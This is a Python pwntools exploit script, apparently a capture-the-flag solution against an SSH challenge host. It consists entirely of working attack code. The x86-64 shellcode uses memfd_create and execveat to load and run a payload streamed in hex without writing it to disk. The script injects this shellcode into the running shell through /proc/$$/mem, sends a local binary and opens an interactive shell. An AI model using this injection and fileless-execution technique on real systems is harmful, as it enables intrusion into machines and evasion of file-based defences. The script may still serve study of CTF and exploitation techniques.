#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context.update(arch="amd64", os="linux")
#context.log_level="debug"

shellcode1 = asm('''
memfd:
/* memfd_create,  create a file mmapped in memory*/
        xor esi,esi
        xor eax,eax
        mov ax,319
        mov rdi,rsp
        syscall
        mov ebp,eax             /* store memfd fd in ebp */

/* convert hexadecimal to binary (sorry for ugly code)*/
read:
	xor edi,edi
        mov rsi,rsp
        xor eax,eax
        push 2
        pop rdx
        syscall
	mov al,[rsi]
        cmp al,0xa		/* if char is carriage return, ignore it (newline) and continue reading */
	jz  read
	cmp al,0x2e             /* char "." indicates end of file */
	jz execveat

/* hexadecimal to binary, convert first char */
	sub al,0x30
	cmp al,9
	jle good
	sub al, 0x27
good:
	shl al,4
	mov bl,[rsi+1]
	sub bl,0x30
	cmp bl,9
	jle good2
	sub bl, 0x27
good2:
	or al,bl
	mov [rsi],al

/* write the byte converted to memfd file */
        mov  edi,ebp
        push 1
        pop rax
	push 1
	pop rdx
        syscall
        jmp read  /* continue reading next byte */

execveat:
        push    rbp
        pop     rdi
        xor eax,eax
        cdq
        mov ax,322
        push rdx
        pop r10
        xor     ecx,ecx
        mov     ch,0x10
        push rcx
        pop r8
        push rdx
        mov rsi,rsp
        syscall
''')


ssh_conn = ssh(host='i-heart-pwn.ctfi.ng', user='tua-cugina', auth_none=True)
shell = ssh_conn.shell()
print("booting wait...")

cmd = 'cd /proc/$$;read a<syscall;exec 3>mem;echo '+b64e(shellcode1)+'|base64 -d|dd bs=1 seek=$[`echo $a|cut -d" " -f9`]>&3'

shell.sendlineafter(b'm$ ', cmd.encode())

shell.recvuntil(b'out\r\r\n', drop=True)

# send data line by line in hexadecimal
with open(f"exploit2", 'rb') as f:
 while True:
   chunk = f.read(32)
   if not chunk:
      break  # EOF reached
   hex_chunk = enhex(chunk)
   shell.sendline(hex_chunk.encode()+b'\x0a')  # Or replace with your sending l
shell.sendline(b'..')
shell.recvuntil(b'..', drop=True)

shell.interactive()

